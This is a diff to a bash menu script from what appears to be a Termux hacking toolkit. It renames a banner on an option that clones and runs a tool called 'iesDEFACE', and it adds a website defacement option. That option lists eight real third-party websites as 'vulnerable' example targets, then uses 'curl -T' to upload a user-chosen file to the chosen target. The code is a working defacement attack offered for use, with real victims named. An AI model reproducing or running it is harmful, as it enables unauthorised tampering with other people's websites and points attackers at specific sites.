@@ -37,7 +37,7 @@ fi
 if [ $bro = 2 ] || [ $bro = 2 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet " Bahauddin " | lolcat
 sleep 1 
 apt install git
 apt install bash
@@ -46,4 +46,30 @@ git clone https://github.com/ALX-04/iesDEFACE
 mv iesDEFACE $HOME
 cd $HOME/iesDEFACE
 bash iesDeface.sh
+fi
+
+if [ $bro = 44 ] || [ $bro = 44 ]
+then
+clear
+echo "\033[34;1m"
+cowsay -f kiss.cow "Bahauddin" | lolcat
+figlet -f slant Bahauddin
+echo "\033[37;1m"
+echo "Masukan Web target"
+echo "Contoh Web Target vuln"
+echo "	http://bestilling.udir.no/"
+echo "	http://560560.ru/"
+echo "	http://myownemailer.com/"
+echo "	http://Zoocentral.co.za/"
+echo "	http://50-50-50.ru/"
+echo "	http://tirupurjobs.net/"
+echo "	http://Matrimony.co.za/"
+echo "	http://Bheh.co.za/"
+read -p "[Bahauddin]>" target
+echo "Masukan Nama script kalian"
+echo "yang ada di Luar Folder Ruang Penyimpanan"
+read -p "[Bahauddin]>" script
+curl -T /storage/emulated/0/$script $target
+echo "\033[33;1m"
+echo "Selesai! Tod Cek di $target $script "
 fi
